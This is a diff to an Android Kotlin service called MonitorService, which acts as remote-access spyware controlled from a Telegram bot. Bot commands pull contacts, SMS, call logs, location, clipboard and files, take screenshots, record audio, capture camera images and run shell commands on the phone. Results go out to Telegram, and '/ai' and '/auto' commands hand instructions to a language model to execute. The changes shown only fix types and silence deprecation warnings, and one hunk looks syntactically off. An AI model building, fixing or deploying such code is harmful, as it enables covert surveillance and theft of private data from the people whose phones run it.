@@ -244,33 +244,33 @@ class MonitorService : Service() {
         } else if (trimmed == "/status") {
             sendTelegramMessage(chatId, "Service: Running\nDevice: ${Build.MODEL}\nAndroid: ${Build.VERSION.RELEASE}")
         } else if (trimmed == "/contacts") {
-            sendTelegramTask(chatId, "contacts", hashMapOf<String, Any>())
+            sendTelegramTask(chatId, "contacts", hashMapOf<String, Any>() as Map<String, Any>)
         } else if (trimmed == "/sms") {
-            sendTelegramTask(chatId, "sms", hashMapOf<String, Any>())
+            sendTelegramTask(chatId, "sms", hashMapOf<String, Any>() as Map<String, Any>)
         } else if (trimmed == "/calls") {
-            sendTelegramTask(chatId, "call_logs", hashMapOf<String, Any>())
+            sendTelegramTask(chatId, "call_logs", hashMapOf<String, Any>() as Map<String, Any>)
         } else if (trimmed == "/apps") {
-            sendTelegramTask(chatId, "apps", hashMapOf<String, Any>("action" to "list"))
+            sendTelegramTask(chatId, "apps", hashMapOf<String, Any>("action" to "list") as Map<String, Any>)
         } else if (trimmed == "/location") {
-            sendTelegramTask(chatId, "location", hashMapOf<String, Any>("action" to "get"))
+            sendTelegramTask(chatId, "location", hashMapOf<String, Any>("action" to "get") as Map<String, Any>)
         } else if (trimmed == "/files") {
-            sendTelegramTask(chatId, "files", hashMapOf<String, Any>("action" to "list", "path" to "/sdcard"))
+            sendTelegramTask(chatId, "files", hashMapOf<String, Any>("action" to "list", "path" to "/sdcard") as Map<String, Any>)
         } else if (trimmed == "/wifi") {
-            sendTelegramTask(chatId, "wifi", hashMapOf<String, Any>("action" to "scan"))
+            sendTelegramTask(chatId, "wifi", hashMapOf<String, Any>("action" to "scan") as Map<String, Any>)
         } else if (trimmed == "/clipboard") {
-            sendTelegramTask(chatId, "clipboard", hashMapOf<String, Any>("action" to "get"))
+            sendTelegramTask(chatId, "clipboard", hashMapOf<String, Any>("action" to "get") as Map<String, Any>)
         } else if (trimmed == "/screenshot") {
-            sendTelegramTask(chatId, "screen", hashMapOf<String, Any>("action" to "capture"))
+            sendTelegramTask(chatId, "screen", hashMapOf<String, Any>("action" to "capture") as Map<String, Any>)
         } else if (trimmed == "/audio") {
-            sendTelegramTask(chatId, "audio", hashMapOf<String, Any>("action" to "start", "duration" to 10))
+            sendTelegramTask(chatId, "audio", hashMapOf<String, Any>("action" to "start", "duration" to 10) as Map<String, Any>)
         } else if (trimmed == "/camera") {
-            sendTelegramTask(chatId, "camera", hashMapOf<String, Any>("action" to "capture", "camera" to 0))
+            sendTelegramTask(chatId, "camera", hashMapOf<String, Any>("action" to "capture", "camera" to 0) as Map<String, Any>)
         } else if (trimmed.startsWith("/ai ")) {
             handleAiCommand(chatId, trimmed.substring(4).trim())
         } else if (trimmed.startsWith("/auto ")) {
             handleAiCommand(chatId, "Auto-execute: ${trimmed.substring(6).trim()}")
         } else if (trimmed.startsWith("/shell ")) {
-            sendTelegramTask(chatId, "shell", hashMapOf<String, Any>("command" to trimmed.substring(7).trim()))
+            sendTelegramTask(chatId, "shell", hashMapOf<String, Any>("command" to trimmed.substring(7).trim()) as Map<String, Any>)
         } else {
             sendTelegramMessage(chatId, "Unknown. Use /help")
         }
@@ -513,7 +513,7 @@ class MonitorService : Service() {
                 "freq" to r.frequency,
                 "caps" to r.capabilities
             ) as Map<String, Any>
-        }
+        )
         return hashMapOf<String, Any>(
             "networks" to networks,
             "count" to networks.size
@@ -728,6 +728,7 @@ class MonitorService : Service() {
                 "parse_mode" to "Markdown"
             ) as Map<String, Any>
             val jsonBody = gson.toJson(params)
+            @Suppress("DEPRECATION")
             val mediaType = MediaType.parse("application/json")
             val body = RequestBody.create(mediaType, jsonBody)
             val req = Request.Builder().url(url).post(body).build()
@@ -747,7 +748,7 @@ class MonitorService : Service() {
                     .addFormDataPart("chat_id", chatId.toString())
                     .addFormDataPart("caption", caption)
                     .addFormDataPart("document", filename,
-                        RequestBody.create(MediaType.parse("text/plain"), file.readBytes()))
+                        @Suppress("DEPRECATION") RequestBody.create(MediaType.parse("text/plain"), file.readBytes()))
                     .build()
 
                 val req = Request.Builder().url("$TELEGRAM_API$BOT_TOKEN/sendDocument").post(requestBody).build()
@@ -818,6 +819,7 @@ Only respond with valid JSON, no extra text."""
             ) as Map<String, Any>
 
             val jsonBody = gson.toJson(payload)
+            @Suppress("DEPRECATION")
             val mediaType = MediaType.parse("application/json")
             val body = RequestBody.create(mediaType, jsonBody)
             val req = Request.Builder()
